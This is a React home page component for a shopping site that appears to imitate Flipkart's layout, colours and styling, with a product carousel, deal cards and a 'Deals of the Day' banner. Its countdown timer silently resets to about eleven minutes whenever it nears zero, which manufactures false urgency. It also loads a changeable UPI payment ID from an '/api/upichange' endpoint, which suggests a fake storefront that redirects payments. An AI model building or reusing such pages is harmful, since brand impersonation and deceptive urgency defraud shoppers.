import Layout from '@/componets/Layout';
import { useEffect, useState } from 'react';
import { items } from "../../public/Items.json";
import { Carousel } from "react-bootstrap";
import { IoMdClock } from "react-icons/io";
import Card from '@/componets/Card';
// import "bootstrap/dist/css/bootstrap.min.css";
function Home() {
  const initialTime = 700; // 10 minutes in seconds
  const [time, setTime] = useState(initialTime);
  // // Uncomment the useEffect block to use it
  useEffect(() => {
    const timer = setInterval(() => {
      if (time <= 0) {
        clearInterval(timer);
      } else {
        setTime((prevTime) => prevTime - 1);
      }
      if (time < 10) {
        setTime(700)
      }
    }, 1000);

    return () => {
      clearInterval(timer);
    };
  }, [time]);
  const [products, setProducts] = useState([]);
  const [products1, setProducts1] = useState({ pixelId: "" });

  useEffect(() => {
    fetchProducts();
    fetchProducts1();
  }, []);
  const fetchProducts1 = async () => {
    try {
      let headersList = {
        "Accept": "*/*",
        "User-Agent": "Thunder Client (https://www.thunderclient.com)",
        "Content-Type": "application/json",
        "Authorization": `Bearer ${localStorage.getItem("token")}`
      };

      const response = await fetch('/api/upichange', {
        method: 'GET',
        headers: headersList,
      });

      if (response.ok) {
        const data = await response.json();
        localStorage.setItem("upi", data.upi.upi)
        setProducts1(data.pixelId);
      } else {
      }
    } catch (error) {
    }

  };
  const fetchProducts = async () => {
    try {
      const response = await fetch('/api/products');
      const data = await response.json();
      setProducts(data);
    } catch (error) {
    }
  };
  useEffect(() => {
    const timer = setInterval(() => {
      if (time <= 0) {
        clearInterval(timer);
      } else {
        setTime((prevTime) => prevTime - 1);
      }
    }, 1000);

    return () => {
      clearInterval(timer);
    };
  }, [time]);

  const { bootstrap } = items;
  const [index, setIndex] = useState(0);
  const handleSelect = (selectedIndex, e) => {
    setIndex(selectedIndex);
  };
  const settings = {
    dots: true,
    infinite: true,
    speed: 500,
    slidesToShow: 1,
    slidesToScroll: 1,
  };

  return (
    <>
      <Layout data={products1}>
        <div id="container" style={{ overflow: "hidden" }}>
          <div style={{ height: "100%" }} data-reactroot="">
            <style
              dangerouslySetInnerHTML={{
                __html:
                  "\n    div {\n        font-size: 20px;\n        text-align: center;\n    }\n"
              }}
            />
            <div>
              <div className="_2dxSCm">
                <div className="_38U37R" style={{
                  backgroundColor: "#2874f0",
                }}>
                  <div>
                    <div className="_1FWdmb pt-2" style={{
                      backgroundColor: "#2874f0",
                      display: "flex",
                      justifyContent: "space-between"
                    }}>
                      <a className="_3NH1qf mx-4 my-2" style={{
                        display: "flex", width: "65%"
                      }}>
                        <svg fill="#FFF" height="36" viewBox="0 0 24 24" width="21" xmlns="http://www.w3.org/2000/svg"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
                        <a className="Z4_K_h mx-3" style={{ width: 85 }}>
                          <img
                            src="/uploads/Q18Ifxk.webp"
                            className="_31Y9yB"
                            style={{ width: 85 }}
                          />
                        </a>
                      </a>

                      <div className="_2WBW6z" />
                      <a href="#/mobile.html#" className="_3NH1qf">
                        <svg
                          width={16}
                          height={16}
                          className='mt-3'
                          viewBox="0 0 15 15"
                          xmlns="external452e452e452e452e452e.html?link=http://www.w3.org/2000/svg"
                        >
                          <g fill="#fff" fillRule="evenodd">
                            <path d="m5.189 13.04c0 .996-.791 1.804-1.767 1.804-.976 0-1.767-.808-1.767-1.804 0-.996.791-1.804 1.767-1.804.976 0 1.767.808 1.767 1.804" />
                            <path d="m14.912 2.259h-14.298l2.247 6.917c.042.129.16.216.293.216h8.06c-.064.69-.629 1.841-1.702 1.841h-6.04l1.072 1.991h5.611c1.881 0 2.938-2.278 3.657-4.719.888-3.01 1.219-6.245 1.106-6.245" />
                            <path d="m.615 2.259l-.592-1.828c-.08-.207.069-.431.287-.431h1.482c.126 0 .24.079.287.198l.682 2.061c0 0-.63 1.642-1.942.066" />
                            <path d="m2.262.756c0 0 .498 1.503 2.234 1.503l-1.736.749-1.104-.749.607-1.503" />
                            <path d="m13.424 13.325c0 .837-.664 1.516-1.484 1.516-.82 0-1.484-.679-1.484-1.516 0-.837.664-1.516 1.484-1.516.82 0 1.484.679 1.484 1.516" />
                          </g>
                        </svg>
                        <span className="_2tVMo0">1</span>
                      </a>
                    </div>
                    <div>
                      <div className="_3QNhdh " id="guidSearch">
                        <div className="ORogdv ">
                          <div className="_1k9EoO ">
                            <div className="_2d36Hu">
                              <a href="#/mobile.html#search" className="search-div">
                                <input
                                  type=""
                                  className="_1eMB9R my-1"
                                  placeholder="Search for Products, Brands and More"
                                  defaultValue=""
                                  style={{
                                    width: "92%",
                                    fontSize: 14,
                                    padding: "7px 10px",
                                    margin: 3,
                                    border: "none",
                                    borderRadius: 5
                                  }}
                                />
                              </a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <img src={"/uploads/top-bg.a2aad345a2d903ce5659.jpg"} className="img-fluid" />
                <Carousel activeIndex={index} onSelect={handleSelect}>
                  {bootstrap.map((item) => (
                    <Carousel.Item key={item.id} interval={4000}>
                      <img src={item.imageUrl} alt="slides" className='img-fluid' />
                    </Carousel.Item>
                  ))}
                </Carousel>

                <div className="_2rW-uM _3sgvr0 _1cVt6K _1CXxjX" >
                  <div className="_3LrtWH ">
                    <div className="_3QuZpZ dod-div">
                      <div className="dod-label"> Deals of the Day </div>
                      <div className="_1oETR8">
                        <div className="_1dZamR _2mmD4F">
                          <IoMdClock style={{ fontSize: 19 }} className='mx-2' />
                          <div id="test">
                            {Math.floor(time / 60)}:{time % 60}</div>
                        </div>
                      </div>
                    </div>
                    <div className="_3Nxu4r">
                      <button className="_1s54Jm btn-sale-is-live">SALE IS LIVE</button>
                    </div>
                  </div>
                </div>
                <div className='row' style={{ background: "#f1f2f4" }}>
                  {products?.length > 0 ?
                    products?.map((item, index) => {
                      if (item.mrp) {
                        return <Card key={item.id} item={item} index={index} />;
                      }
                    }) : <>
                      <img className="mt-3" src={`https://icon-library.com/images/loading-icon-animated-gif/loading-icon-animated-gif-19.jpg`} />
                    </>}

                </div>
              </div>
            </div>
          </div>
          <footer className="seofooter" id="seofooter"></footer>
        </div >
      </Layout>

    </>

  );
}

export default Home;
